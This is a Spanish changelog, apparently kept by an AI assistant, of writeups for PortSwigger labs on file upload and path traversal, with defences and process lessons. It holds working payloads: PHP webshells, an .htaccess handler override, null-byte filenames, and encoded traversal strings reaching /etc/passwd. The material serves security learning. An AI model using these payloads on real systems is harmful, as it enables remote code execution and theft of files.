- `inventario/04-explotacion/web/explotacion-fileupload.md`: + writeup en `learning_refs:`. Cluster File Upload completo con 6/6 labs (3 Apprentice + 3 Practitioner) linkeados.

### Cluster File Upload completado

Los 6 labs del cluster cubren las defensas progresivas más comunes contra upload + RCE y sus bypasses específicos. El insight transversal: la defensa estructuralmente robusta es la combinación de capas — whitelist de extensión, magic bytes, re-encoding server-side, filename server-controlled, directorio sin ejecución, mínimo privilegio. Cada capa cierra una clase de bypass; ninguna por sí sola es suficiente. Filename server-controlled + re-encoding son las dos defensas más fuertes — cada una cierra una familia entera de bypasses.

## [2026-05-09] — Writeup PortSwigger Web shell upload via obfuscated file extension

Quinto lab del cluster File Upload (Practitioner). Defensa: blacklist de extensiones PHP **+ bloqueo de `.htaccess`** (cierra el bypass del lab anterior). Bypass: null byte para obfuscar la extensión. `exploit.php%00.jpg` — el validador parsea la extensión post-último-punto y ve `.jpg` (PHP/Python tratan `\0` como char válido en strings). El filesystem trunca en `\0` y guarda como `exploit.php`. Apache lo procesa como PHP.

### Hallazgos no triviales documentados en el writeup

1. **Validar extensión por string ≠ validar extensión del path final**: el validador opera sobre la representación textual del filename (lenguajes managed soportan `\0` interno como char válido); el filesystem opera sobre bytes hasta `\0` (semántica de string en C). La diferencia entre los dos modelos es el bypass.
2. **Trace exacto de bytes**: filename string PHP `"exploit.php\x00.jpg"` (16 bytes); `pathinfo` lee ext `".jpg"` (post-último-punto literal); validación pasa. libc/kernel recibe los mismos 16 bytes pero para de leer en `\0`; path efectivo `"exploit.php"` (11 bytes). La validación opera en zona [0,16], el filesystem en [0,11]. Discrepancia = bypass.
3. **Tabla de técnicas de obfuscación de extensión**: null byte (canónico), doble extensión (Apache `mod_mime` legacy), trailing dot/space (algunos FS strippean), caracteres invisibles, case manipulation (raro en stacks modernos), magic bytes spoof. Null byte es estructural; las otras dependen de quirks específicos del stack.
4. **Apache double extension RCE**: variante interesante con `exploit.php.jpg`. Apache con `mod_mime` legacy y `AddHandler` (en lugar de `AddType`) puede procesar como PHP "porque tiene .php en algún lugar". Cerrado en Apache moderno con `AddType` correcto. Bug class conocida pero rara hoy.
5. **Por qué null byte sigue funcionando en este lab pese a stacks modernos**: PortSwigger emula PHP < 5.3.4 vulnerable. En la práctica hoy aparece en apps PHP legacy, code paths que pasan filename a binarios externos vía subprocess, librerías nativas C/C++ sin wrapper, sistemas embebidos.
6. **Filename server-controlled cierra TODA la familia de obfuscaciones**: rename a UUID/hash convierte cualquier obfuscación en irrelevante porque el filename del cliente no se usa para el path final. Defensa estructuralmente más fuerte que cualquier filter sobre el filename. Cierra null byte, doble extensión, trailing chars, path traversal, `.htaccess`, dotfiles — todos los bypasses del cluster basados en filename.
7. **Tabla de progresión de los 5 labs del cluster**: simple → content-type → path-traversal → extension-blacklist (`.htaccess`) → obfuscated-extension (null byte). 5 asunciones rotas, una sola defensa correcta (whitelist + magic bytes + filename server-controlled + dir sin scripts). Catálogo de "qué representación del input la defensa mira vs cuál el sistema ejecuta".

### Archivos nuevos

- **`learning/portswigger/file-upload-obfuscated-file-extension/writeup.md`**: 6 secciones, request multipart real, antipatrón PHP `pathinfo` post-último-punto, trace byte-por-byte de la discrepancia entre validación y filesystem, tabla de 7 técnicas de obfuscación, detalle de Apache `mod_mime` doble extensión, historia de mitigación por stack, 5 capas de defensa con énfasis en filename server-controlled.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `explotacion-fileupload.md`. Inventario en 134 archivos.
- `inventario/04-explotacion/web/explotacion-fileupload.md`: + writeup en `learning_refs:`. Ahora linkea los 5 labs del cluster File Upload (3 Apprentice + 2 Practitioner).

### Lección de proceso

User probó el null byte como primer intento sin necesidad de explorar las otras técnicas (doble extensión, trailing dot, case). Documenté las variantes igual en el writeup como referencia para labs/CTFs futuros donde null byte falle. Heurística operacional: cuando hay múltiples bypasses posibles, ordenar por probabilidad de éxito (null byte = canónico estructural) y caer a las quirky (trailing dot = filesystem-specific) si el primero falla. El writeup debe documentar el árbol de decisión completo, no solo el camino que funcionó.

## [2026-05-09] — Writeup PortSwigger Web shell upload via extension blacklist bypass

Cuarto lab del cluster File Upload (Practitioner — primer Practitioner del cluster). Defensa: blacklist comprensiva de extensiones PHP (`.php`, `.phtml`, todas las variantes `.ph*`) con mensaje "Sorry, php files are not allowed". Bypass: dos uploads — primero `.htaccess` con `AddType application/x-httpd-php .l33t`, después `exploit.l33t` con webshell. Apache lee el `.htaccess` del directorio y procesa `.l33t` como PHP.

### Hallazgos no triviales documentados en el writeup

1. **`.htaccess` upload rompe la asunción "extensiones ejecutables son conjunto fijo"**: la blacklist asume que el set de extensiones que Apache mapea a PHP es estático y conocido. `.htaccess` permite redefinir esos mapeos por-directorio. La blacklist correcta no es "qué extensiones son PHP" sino "qué archivos pueden cambiar la config del server".
2. **Por qué Apache respeta `.htaccess`**: feature originalmente para shared hosting donde el cliente no podía editar `httpd.conf`. Habilitada por default vía `AllowOverride All`. Permite directivas tipo `AddType`, `AddHandler`, `SetHandler`, `RewriteRule`, `Options`, ACLs por IP.
3. **Familia de archivos peligrosos en uploads más allá de `.php`**: `.htaccess` (Apache), `web.config` (IIS — equivalente con XML que define handlers), archivos con BOM, archivos referenciados desde otras configs. La blacklist por extensión no captura ninguno; whitelist sí.
4. **Variantes del bypass `.htaccess`** si `AddType` no funciona: `SetHandler application/x-httpd-php`, `AddHandler application/x-httpd-php .l33t`, `RewriteRule` para servir `.l33t` como `.php`. Si `AllowOverride None`, el `.htaccess` no se aplica — fallback a extensiones que el server YA mapea pero no estén en la blacklist.
5. **Por qué este lab es Practitioner y los anteriores Apprentice**: bypass requiere conocimiento del stack defensivo (Apache, `.htaccess`, `AllowOverride`), no solo del input. Primera vez en el cluster donde el atacante necesita conocer el server, no solo experimentar con el comportamiento de la app.
6. **IIS analog**: subir `web.config` con `<handlers>` que mapea `.config` a ASP. Misma clase de bug en Windows. Defensa equivalente: deshabilitar override por-directorio o usar whitelist.
7. **Filename server-controlled cierra TODA la familia de bypasses basados en filename**: rename a UUID/hash ignorando filename del cliente cierra `.htaccess`, `web.config`, dotfiles, doble extensión, null byte, path traversal, extensiones alternativas. Defensa más fuerte que cualquier filter de string sobre el filename.

### Archivos nuevos

- **`learning/portswigger/file-upload-extension-blacklist-bypass/writeup.md`**: 6 secciones, dos requests reales (`.htaccess` upload + webshell upload), explicación de qué es `.htaccess` y por qué Apache lo respeta, antipatrón PHP blacklist + Apache `AllowOverride All`, variantes del bypass (SetHandler, AddHandler, RewriteRule), IIS analog con `web.config`, 5 capas de defensa con énfasis en filename server-controlled, tabla comparativa de los 4 labs del cluster.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `explotacion-fileupload.md`. Inventario en 134 archivos.
- `inventario/04-explotacion/web/explotacion-fileupload.md`: + writeup en `learning_refs:`. Ahora linkea los 4 labs del cluster File Upload (3 Apprentice + 1 Practitioner).

### Lección de proceso

User probó `.phtml` después de `.php` con el mismo mensaje de error. Antes de seguir probando variantes (`.php5`, `.phar`, `.pht`), salté directamente a `.htaccess` porque la blacklist parecía comprensiva y enumerar variantes era consumir tiempo. Heurística: cuando el primer recon (`.php`) y el secundario (`.phtml` — la variante más común) dan el mismo mensaje verbose, asumir blacklist comprensiva y atacar la asunción detrás (no las extensiones específicas). Pasar a un bypass conceptualmente distinto (`.htaccess` redefine el mapeo) en lugar de intentar bypass del mismo tipo (otra extensión PHP).

## [2026-05-09] — Writeup PortSwigger Web shell upload via path traversal

Tercer lab del cluster File Upload (Apprentice). Dos defensas activas: (A) Content-Type del part (heredada del lab anterior) y (B) `/files/avatars/` no ejecuta PHP (texto plano). Bypass: Content-Type → `image/jpeg` + filename → `..%2fexploit.php`. El server strippea `../` literal pero no decodifica `%2f` antes del filter; después del decode interno, el archivo aterriza en `/files/exploit.php` que sí ejecuta PHP.

### Hallazgos no triviales documentados en el writeup

1. **Defensa-en-profundidad colapsa si el atacante elige el directorio**: deshabilitar ejecución de PHP en `/files/avatars/` es defensa correcta solo cuando el filename del cliente no puede mover el archivo. Path traversal en el filename rompe la asunción y restaura ejecución vía aterrizar en directorio padre que sí ejecuta.
2. **Diagnóstico vía mensaje del server**: primer intento con `../exploit.php` literal devolvió "The file avatars/exploit.php has been uploaded" (notar el `avatars/` sin el `../`). Confirmación inmediata de que el filter strippeó el `../`. Mensaje del server filtra exactamente el path final, lo cual orienta el siguiente bypass.
3. **Filter `str_replace('../', '')` se bypass-ea con encoding del slash**: `..%2fexploit.php` no contiene `/` literal, así que el strip no matchea. Después la decodificación interna (PHP/framework) convierte `%2f` en `/`. Mismo antipatrón estructural que el lab "superfluous URL decode" del cluster Path Traversal — validar antes de la transformación final.
4. **Tabla comparativa con lab análogo del cluster Path Traversal**: vector (lectura vs escritura), filter (rechaza vs strippea), bypass (`..%252f` doble vs `..%2f` single), defensa rota (validar antes del 2do decode vs antes del 1er decode). Antipatrón general "validate before canonicalize" tiene instancias simétricas en lectura y escritura.
5. **Por qué `/files/` ejecuta PHP pero `/files/avatars/` no**: config Apache donde el sysadmin agregó restricción específicamente al directorio donde aterrizan uploads (`<Files *.php> SetHandler text/plain` o `php_flag engine off` en `.htaccess`). El padre quedó con la default. Defensa correcta: deshabilitar ejecución en TODO el subtree de uploads, no solo en el directorio inmediato.
6. **Composición de bypasses requerida**: este lab necesita Content-Type bypass (heredado del lab anterior) AND path traversal en filename. Las dos defensas existen simultáneamente y se atacan al mismo tiempo. Lab progresivo donde defensas anteriores siguen activas.
7. **Filename server-controlled como mitigación estructural**: rename a UUID/hash ignorando el filename del cliente cierra todos los bugs basados en path en el filename. La intención del cliente (nombre legible) puede guardarse en metadatos separados sin afectar el path real. Defensa más fuerte que filtros de string sobre el filename.

### Archivos nuevos

- **`learning/portswigger/file-upload-path-traversal/writeup.md`**: 6 secciones, request multipart real con dos cambios (Content-Type + filename encoded), antipatrón PHP `str_replace('../', '')` antes de decode, tabla comparativa con `superfluous-url-decode` del cluster Path Traversal, análisis de Apache config (por qué `/files/` ejecuta y `/files/avatars/` no), 5 capas de defensa con énfasis en filename server-controlled, tabla comparativa de los 3 labs del cluster.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `explotacion-fileupload.md`. Inventario en 134 archivos.
- `inventario/04-explotacion/web/explotacion-fileupload.md`: + writeup en `learning_refs:`. Ahora linkea los 3 labs del cluster File Upload.

### Lección de proceso

User olvidó el `Content-Type: image/jpeg` en el primer intento de path traversal y reportó "no funciona". Diagnostiqué pidiendo el response del upload (que confirmó "uploaded as avatars/exploit.php" — filter strippeando `../`). Pero la falta de Content-Type también podría haber bloqueado el upload entero. Lección: cuando un bypass progresivo falla, primero verificar que los bypasses anteriores siguen aplicados; los labs del cluster acumulan defensas y los bypasses se componen, no se reemplazan. Heurística operacional para agentes: pedir el request completo (no solo el cambio relevante) cuando un bypass nuevo no funciona, para detectar regresiones en bypasses heredados.

## [2026-05-08] — Writeup PortSwigger Web shell upload via Content-Type restriction bypass

Segundo lab del cluster File Upload (Apprentice). La defensa: la app valida el `Content-Type` del part multipart del archivo, rechaza tipos no-imagen con mensaje verbose ("Only image/jpeg and image/png are allowed"). Bypass: interceptar en Burp y cambiar el `Content-Type` del part de `application/x-php` a `image/jpeg`. Server acepta el upload, archivo queda en `/files/avatars/exploit.php`, ejecución idéntica al lab anterior.

### Hallazgos no triviales documentados en el writeup

1. **Validar el `Content-Type` del part multipart es trust-the-client**: el header lo setea el cliente al construir el request. El browser lo deriva de la extensión local del archivo (mapeo OS), pero cualquier cliente no-browser (Burp, curl, scripts) lo manda como quiera. RFC 2388 lo describe como opcional e informativo, no como input de seguridad.
2. **Familia del antipatrón "trust client-set headers"**: `Content-Type` (multipart, request), `Referer` (validar origen para authz), `User-Agent` (anti-bot), `X-Forwarded-For` (IP whitelisting), `Origin` (CSRF sin token), `Host` (SSRF allowlist). Patrón común: server delega decisión de seguridad a atributo que el cliente controla. Defensa correcta usa atributos que el server controla (sesión, contenido real del archivo, IP de la conexión TCP).
3. **Mensajes de error verbose facilitan reconocimiento del atacante**: el error filtró exactamente la whitelist (`image/jpeg`, `image/png`). Bypass evidente. Regla defensiva: rechazar con mensaje genérico ("File type not allowed") y loguear detalles server-side para forensics, no devolverlos al cliente.
4. **Magic bytes es la defensa correcta**: `mime_content_type()` (PHP), `python-magic`, `Tika` (Java) leen los primeros bytes del archivo y detectan el tipo desde el contenido real. Un archivo PHP no empieza con `FF D8 FF` (JPEG) ni `89 50 4E 47` (PNG). El cliente puede declarar lo que quiera en el header; el contenido es lo único autoritativo.
5. **Workflow operacional con Burp para multipart**: dos opciones — (A) interceptor activo, modificar el part y forward; (B) más cómodo, usar Repeater después del primer intento fallido en HTTP history. La línea a editar es solo el `Content-Type` del part del archivo, no el `Content-Type` del request global (`multipart/form-data; boundary=...`).
6. **Lo que `$_FILES['x']['type']` (PHP) y equivalentes reflejan**: el header del part, no el contenido real. Equivalentes en otros stacks: `request.files['avatar'].content_type` (Flask), `MultipartFile.getContentType()` (Spring), `req.file.mimetype` (Express). Todos pasan el header tal cual lo mandó el cliente. Code review checklist: cualquier uso de estos accessors para decisión de seguridad es bug.
7. **Tabla de progresión de los 2 labs del cluster**: simple-rce (sin defensa) → content-type-bypass (validación de Content-Type del part, bypass cambiando el header). Caso particular del patrón general "trust client-set data" repetido en path traversal, access control, etc.

### Archivos nuevos

- **`learning/portswigger/file-upload-content-type-restriction-bypass/writeup.md`**: 6 secciones, request multipart real con la línea exacta a editar, antipatrón PHP `$_FILES['avatar']['type']`, tabla de la familia "trust client-set headers" (7 headers comunes mal usados como autoridad), workflow operacional con Burp (interceptor vs Repeater), defensa correcta con magic bytes + 3 capas.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `explotacion-fileupload.md`. Inventario en 134 archivos.
- `inventario/04-explotacion/web/explotacion-fileupload.md`: + writeup en `learning_refs:`. Ahora linkea ambos labs del cluster File Upload.

### Lección de proceso

User preguntó cómo "poner el attachment desde Burp" — confusión entre disparar un upload vs interceptar uno existente. Burp no construye requests desde cero, intercepta lo que el cliente ya envía (o uno mandado a Repeater). Documenté ambas opciones operacionales (interceptor activo vs Repeater desde HTTP history) para que sean reusables. Generalización: cuando el user pregunta cómo "hacer X en Burp", chequear que el modelo mental del flujo (browser dispara → Burp intercepta → editás → Burp manda) esté claro antes de los pasos específicos.

## [2026-05-08] — Writeup PortSwigger Remote code execution via web shell upload

Primer lab del cluster File Upload Vulnerabilities (Apprentice, baseline sin defensas). El upload de avatar en `/my-account/avatar` no valida nada (extensión, Content-Type, magic bytes). Webshell PHP `<?php echo file_get_contents('/home/carlos/secret'); ?>` queda en `/files/avatars/exploit.php` y el server lo ejecuta. Lab solved leyendo el secret desde la URL del avatar.

### Hallazgos no triviales documentados en el writeup

1. **RCE vía upload requiere dos bugs simultáneos, no uno**: (A) falta de validación al subir, y (B) ejecución de scripts en el directorio de upload. Cualquiera cerrado mitiga al otro: con whitelist de extensiones el atacante no puede colocar el `.php`; con `php_flag engine off` en el directorio, el archivo se sirve como texto inerte aunque haya pasado el upload. Defensa-en-profundidad clásica.
2. **HTML del form ≠ contrato del backend**: la página de blog post tenía un form de comentarios con `<input type="file" name="avatar">` que aparentaba aceptar uploads, pero el endpoint `/post/comment` rechazaba el archivo con 400 "Missing parameter". El upload real estaba en `/my-account/avatar`. Lección: cuando un upload falla pese a HTML que sugiere lo contrario, probar otros endpoints antes de asumir defensa.
3. **Filename predecible facilita la explotación**: el server guardó el archivo con el filename del cliente (`exploit.php`), así que la URL fue determinable (`/files/avatars/exploit.php`) y el HTML del avatar la reveló explícitamente. Rename server-side a UUID/hash convierte upload exitoso en archivo no-localizable, defensa-en-profundidad útil incluso si la validación de extensión funciona.
4. **Webshells útiles más allá del lab**: el shell del lab es de un comando. Variantes operacionales — webshell genérico (`<?php system($_GET['cmd']); ?>`), webshell con auth (`if ($_GET['key'] !== 'mySecret') exit;`), reverse shell (no funciona en PortSwigger por firewall del lab, sí en pentest real).
5. **Por qué este lab es Apprentice**: no hay defensas. Los demás labs del cluster agregan validación de Content-Type, blacklist de extensiones, magic bytes, y sus bypasses específicos. Este lab establece el patrón: subir, identificar URL, ejecutar.
6. **5 capas de defensa correctas**: (1) whitelist de extensiones, (2) magic bytes del contenido real, (3) rename server-side a UUID, (4) almacenamiento fuera del document root o directorio sin ejecución de scripts, (5) mínimo privilegio del proceso del web server.
7. **Bug A vs Bug B en el catálogo de defensas**: Bug A (upload sin validación) se cierra en código de la app. Bug B (ejecución en directorio público) se cierra en config del server (Apache `php_flag engine off`, Nginx `location ~ \.php$ { deny all; }`). Los dos son responsabilidad de equipos distintos y se confunden con frecuencia — el dev cree que el sysadmin restringe el directorio, el sysadmin asume que el dev valida los uploads.

### Archivos nuevos

- **`learning/portswigger/file-upload-rce-via-web-shell-upload/writeup.md`**: 6 secciones, request/response real, antipatrón PHP `move_uploaded_file` + Apache config sin restricciones, 5 capas de defensa, 3 variantes de webshell (mínimo, genérico, con auth), lección operacional sobre HTML form vs backend contract.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `explotacion-fileupload.md` (que ya cubre webshell upload, bypass de extensión, polyglots). Inventario en 134 archivos.
- `inventario/04-explotacion/web/explotacion-fileupload.md`: + writeup en `learning_refs:` (antes era `[]`, primer learning_ref del archivo).

### Lección de proceso

User intentó primero el upload por el form de comentarios del blog post (que tenía un input `type="file"` engañosamente). El server respondió 400 "Missing parameter" — distinto a "ok pero archivo bloqueado" o "endpoint no existe". Yo asumí endpoint equivocado pero pude haber considerado primero que faltaba algún campo del form de comments (email/website). Sí redirigí correctamente a `/my-account` que era el endpoint real, pero el camino más rápido era leer cuidadosamente el HTML del form de comentarios y notar que email/website estaban afuera del form (HTML malformado). Aplicación de la memoria `feedback_form_handlers_js.md`: HTML del form ≠ contrato real.

## [2026-05-08] — Writeup PortSwigger File path traversal, null byte bypass

Sexto y último lab del cluster File path traversal (Practitioner). La defensa: la app valida que el `filename` termine en una extensión permitida (`.jpg`/`.png`/`.gif`). Bypass: insertar un null byte (`%00`) entre el path real y la extensión falsa. Para la validación string-level, el filename termina en `.jpg`. Para el syscall del kernel (C, donde `\0` es terminador), el path efectivo es lo que está antes del null byte. Payload: `../../../etc/passwd%00.jpg`. Notar que este lab NO requiere prefijo (a diferencia del lab anterior); solo valida extensión.

### Hallazgos no triviales documentados en el writeup

1. **Null byte explota la diferencia de semántica de string entre lenguajes managed (Python/Java/PHP) y C**: el lenguaje de la app trata `\0` como un char más con longitud explícita; la libc/kernel lo trata como terminador de string. La interfaz entre las dos capas transfiere el contenido sin propagar la longitud, perdiendo información crítica para seguridad.
2. **Historia de la mitigación por stack**: PHP < 5.3.4 vulnerable, ≥ 5.3.4 (Dec 2010) cerrado. Java < 7u40 vulnerable, ≥ 7u40 (Sep 2013) lanza `InvalidPathException`. Python 3 rechaza desde 3.0 con `ValueError: embedded null byte`. Ruby ≥ 1.9, Node moderno también. C/C++ raw nunca tuvo mitigación. PortSwigger emula la versión vulnerable.
3. **Variantes análogas del antipatrón**: `?`/`#` para parsers que tratan path como URL parcial, newline (`\n`) para parsers de líneas, doble extensión (`passwd.php.jpg` con Apache `mod_mime` mal configurado), long filename truncation por límite del filesystem. Patrón común: la validación procesa el string completo, el ejecutor interpreta solo un prefijo definido por algún byte/char delimitador.
4. **Por qué PortSwigger pone este lab a pesar de la mitigación moderna**: bug class sigue apareciendo en apps PHP legacy sin actualizar desde 2010, code paths que pasan filename a binarios externos vía subprocess (el child hereda el bug), APIs que usan librerías nativas C/C++ sin wrapper que valide, sistemas embebidos con runtimes recortados.
5. **Detalle operacional con Burp**: el `%00` debe quedar literal en la request line (3 chars: `%`, `0`, `0`). Si Burp tiene "URL-decode" activo en alguna capa convierte `%00` en byte nulo literal, lo cual rompe el HTTP/2 framing y produce errores 400 raros. Verificar Raw view antes de enviar.
6. **Defensa correcta combinada con lab anterior**: si el server combinara `startswith(BASE)` + `endswith('.jpg')`, el bypass requiere combinar también: `/var/www/images/../../../etc/passwd%00.jpg`. Cada defensa naïve compuesta es bypass-eable componiendo bypasses. La defensa correcta única: canonicalizar (`realpath`) + validar prefijo + validar extensión sobre el path canónico + rechazar null bytes explícitos.
7. **Tabla de progresión de los 6 labs del cluster**: simple → absolute → non-recursive → superfluous-decode → validate-start-of-path → null-byte-bypass. 6 asunciones rotas distintas (no hay defensa, traversal requiere `..`, strip elimina patrón, input validado = ejecutado, prefijo string = contención path, string validado = string ejecutado por OS). Una sola defensa correcta cubre todas: `realpath(join(base, input))` + validaciones sobre el resultado canonicalizado.

### Archivos nuevos

- **`learning/portswigger/file-path-traversal-validate-file-extension-null-byte-bypass/writeup.md`**: 6 secciones, request/response real, antipatrón Python con trace explícito de cómo `\0` cambia de semántica al cruzar la frontera Python→libc→kernel, historia de la mitigación por stack con CVEs, variantes análogas del antipatrón (URL/`?#`, newline, doble extensión, truncation), composición con start-of-path validation del lab anterior, tabla comparativa final de los 6 labs del cluster.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `analisis-lfi-rfi.md`. Inventario en 134 archivos.
- `inventario/03-analisis-vulnerabilidades/web/analisis-lfi-rfi.md`: + writeup en `learning_refs:`. Cluster Path Traversal completo con 6/6 labs linkeados.

### Cluster File path traversal completado

Los 6 labs del cluster cubren las defensas naïves más comunes contra path traversal y sus bypasses específicos. El insight transversal del cluster: la defensa estructuralmente robusta es independiente de la defensa naïve atacada — siempre canonicalizar la representación final con `realpath` y validar el resultado. Los string filters, validaciones de prefijo/sufijo, replaces y filters entre transformaciones son todos bypass-eables porque operan sobre representaciones intermedias del input, no sobre lo que el sistema ejecuta.

## [2026-05-08] — Writeup PortSwigger File path traversal, validation of start of path

Quinto lab del cluster File path traversal (Practitioner). La defensa: la app valida que el `filename` empiece con un directorio base esperado (`/var/www/images`). Bypass: incluir el prefijo y agregar traversal después. Payload: `/var/www/images/../../../etc/passwd`. La validación `startswith('/var/www/images')` pasa porque el string empieza con el prefijo, pero `open()` canonicaliza `..` durante la resolución y abre `/etc/passwd`.

### Hallazgos no triviales documentados en el writeup

1. **`startswith` sobre input crudo no valida el path canónico**: opera sobre la sintaxis del string como secuencia de chars, no sobre la ruta lógica que el filesystem resuelve. El bypass pasa porque la representación validada (string crudo) difiere de la representación ejecutada (path canonicalizado por el kernel durante `open()`).
2. **El filesystem canonicaliza independientemente de la app**: `..` se resuelve durante el syscall `open()`. La app no necesita procesar `..` para que se resuelva — el kernel lo hace. La defensa que solo opera sobre el string del input no controla ese paso.
3. **Heurística de prefijos para PortSwigger**: `/var/www/images` es el prefijo cableado en el stack PortSwigger Linux para imágenes. Para apps reales, enumerar vía errores que filtren paths, headers, o código fuente filtrado.
4. **Variantes que también funcionan contra esta defensa**: subdirectorios falsos en el prefijo (`/var/www/images/foo/../../../etc/passwd`), `..` extras (más de los necesarios), `./`/no-ops (`/var/www/images/./../../../etc/passwd`). Cualquier string que (a) empiece con el prefijo y (b) contenga `..` suficientes para escapar.
5. **Bypass adicional contra `startswith` sin separador**: `/var/www/imagesEVIL/file` también pasa `startswith('/var/www/images')`. Defensa correcta debe incluir el separador final (`BASE + os.sep`) en el prefijo de comparación.
6. **Por qué Practitioner**: el payload no es complejo, pero requiere reconocer el patrón distinto de defensa (no rechaza `..` ni paths absolutos — rechaza prefijos), adivinar el prefijo correcto, y confiar en que el filesystem canonicaliza aunque la defensa no lo procese. Conocimiento de OS, no del código de la app.
7. **Tabla de progresión de los 5 labs del cluster**: simple → absolute → non-recursive → superfluous-decode → validate-start-of-path. Cada lab agrega una capa de defensa naïve y la rompe con una asunción nueva. Cinco asunciones rotas distintas; una sola defensa correcta (`realpath` + `startswith` con separador) las cubre todas.

### Archivos nuevos

- **`learning/portswigger/file-path-traversal-validate-start-of-path/writeup.md`**: 6 secciones, request/response real, antipatrón Python `startswith` sobre input crudo vs fix con `realpath` + separador, trace de cómo el kernel canonicaliza `..` durante `open()`, variantes y bypass adicional `imagesEVIL`, tabla comparativa de los 5 labs del cluster con las 5 asunciones rotas.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `analisis-lfi-rfi.md`. Inventario en 134 archivos.
- `inventario/03-analisis-vulnerabilidades/web/analisis-lfi-rfi.md`: + writeup en `learning_refs:`. Ahora linkea los 5 labs del cluster Path Traversal.

### Lección de proceso

User adivinó el prefijo `/var/www/images` al primer intento. Esa heurística (PortSwigger Linux usa `/var/www/images` para imágenes de productos) la documenté explícitamente porque ahorra tiempo en labs futuros del catálogo y es transferible a CTFs con stacks similares. Para apps reales el prefijo se enumera vía error messages, headers, o source code leak. Generalización: cuando un lab pide adivinar un valor cableado, documentar el valor + el método de enumeración para apps no-PortSwigger.

## [2026-05-08] — Writeup PortSwigger File path traversal, superfluous URL-decode

Cuarto lab del cluster File path traversal (Practitioner). La defensa: la app rechaza `../` y `..%2f` después del primer URL-decode (el del framework), pero llama explícitamente a `urldecode()` una segunda vez antes de `open()`. Bypass: doble encoding `..%252f`. Después del decode #1 queda `..%2f` (filter no matchea), después del decode #2 queda `../` (path traversal). Payload final: `..%252f..%252f..%252fetc/passwd`.

### Hallazgos no triviales documentados en el writeup

1. **Validar entre dos transformaciones idénticas del input es bypass-eable por construcción**: la representación intermedia (la que el filter ve) es inocua, la representación final (la que se ejecuta) es maliciosa. Patrón general independiente del tipo de encoding.
2. **Decode redundante es vector, no defensa-en-profundidad**: el framework HTTP ya decodifica la query string al parsear. Llamar a `urldecode()` explícitamente otra vez introduce un punto de divergencia entre lo validado y lo ejecutado. "Por las dudas" es el origen del bug.
3. **Diagnóstico operacional vía recon escalonado**: probar payloads de labs anteriores en orden (simple, absolute, non-recursive, single-encode, double-encode). Que single-encode falle y double-encode funcione confirma específicamente que el filter corre **después** del primer decode (sino single-encode pasaría por no contener `../` literal) y **antes** del segundo (sino el bypass no funcionaría).
4. **`urldecode(urldecode(x)) ≠ urldecode(x)`**: la idempotencia parece intuitiva pero falla cuando `x` contiene `%25` literal en el wire. El primer decode convierte `%25` en `%`, formando un nuevo escape `%2X` que el segundo decode resuelve. Asunción común en código que decodifica "por costumbre".
5. **Familia del antipatrón "validar antes de la última transformación"**: HTML decode (`&lt;script&gt;` revertido), Unicode normalization (full-width chars como `SELECＴ`), symlink follow, IDN punycode (`еxample.com` con е cirílica), case folding. Cada uno tiene su lab equivalente en otros dominios — el principio es el mismo: validar la representación final, no la intermedia.
6. **Variantes de encoding cuando el filter rechaza también `..%2f`**: encoding mixto (`..%252f..%2f`), encoding del punto en lugar de la barra (`%2e%2e/`, `..%252e/`), triple encoding (`..%25252f` en stacks WAF+framework+app), UTF-8 overlong (`%c0%af`, casi todos los parsers modernos lo rechazan).
7. **Tabla de progresión de los 4 labs del cluster**: simple (sin defensa) → absolute (filter `../`, bypass `/etc/passwd`) → non-recursive (filter strip una pasada, bypass `....//`) → superfluous-decode (filter entre 2 decodes, bypass `..%252f`). Cada lab agrega una capa de defensa naïve y la rompe con una asunción nueva. Defensa correcta es idéntica desde el primer lab: `realpath(join(base, input))` + `startswith(base + sep)`.

### Archivos nuevos

- **`learning/portswigger/file-path-traversal-superfluous-url-decode/writeup.md`**: 6 secciones, recon escalonado documentado (qué falla y por qué), trace conceptual del doble decode, antipatrón Python con flujo wire→decode#1→filter→decode#2→open, tabla del antipatrón generalizado a HTML/Unicode/symlink/IDN/case folding, variantes de encoding cuando el filter es más estricto, tabla comparativa de los 4 labs del cluster.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `analisis-lfi-rfi.md`. Inventario en 134 archivos.
- `inventario/03-analisis-vulnerabilidades/web/analisis-lfi-rfi.md`: + writeup en `learning_refs:`. Ahora linkea los 4 labs del cluster Path Traversal.

### Lección de proceso

User probó directamente el doble encoding sin pasar por single-encode y los demás escalones del recon. Eficiente para resolver, pero el writeup necesita el escalonamiento explícito para ser pedagógico — el insight "single-encode falla pero double-encode funciona" es lo que diagnostica específicamente el doble decode (vs. otras hipótesis posibles). Documenté el escalón aunque el user no lo haya ejecutado, marcando claramente el orden de complejidad esperado.

## [2026-05-08] — Writeup PortSwigger File path traversal, sequences stripped non-recursively

Tercer lab del cluster File path traversal (Practitioner). La defensa: la app strippea `../` con un `replace` no recursivo (una sola pasada). Bypass canónico: `....//`. Trace: el filter elimina `../` del medio (los dos puntos centrales + barra), las puntas (`..` + `/`) se juntan formando `../`. Tres iteraciones de `....//` después del strip = `../../../`. Payload final: `....//....//....//etc/passwd`.

### Hallazgos no triviales documentados en el writeup

1. **Strip non-recursive es estructuralmente vulnerable**: cualquier filter que elimina ocurrencias de un token en una sola pasada se rompe con inputs del tipo "patrón rodeado por sí mismo". El bypass es construcción, no encoding/escape.
2. **Trace exacto del payload**: en `....//`, el filter matchea `../` en posiciones 2-4 (los dos puntos del medio + la primera barra). Lo strippea. Quedan los chars `[0,1,5]` = `..` + `/` = `../`. La estructura del payload está diseñada para que el strip "extraiga" un `../` y deje las puntas formando otro.
3. **Familia del antipatrón**: el mismo principio explota filters análogos en otros contextos: SQLi (`SELSELECTECT` cuando se filtra `SELECT`), XSS (`<scr<script>ipt>` cuando se filtra `<script>`), prefijos URL (`javasjavascript:cript:` cuando se filtra `javascript:`). Patrón general: blacklist por substring + strip non-recursive = bypass por construcción.
4. **`replace` global ≠ recursivo**: en muchos lenguajes `replace`/`replaceAll` aplica todas las ocurrencias en una pasada, pero **no re-evalúa el resultado**. La diferencia entre "todos los matches en una pasada" y "loop hasta que no haya matches" es sutil. Defensa correcta si se insiste en strip: `while pattern in s: s = s.replace(pattern, '')`.
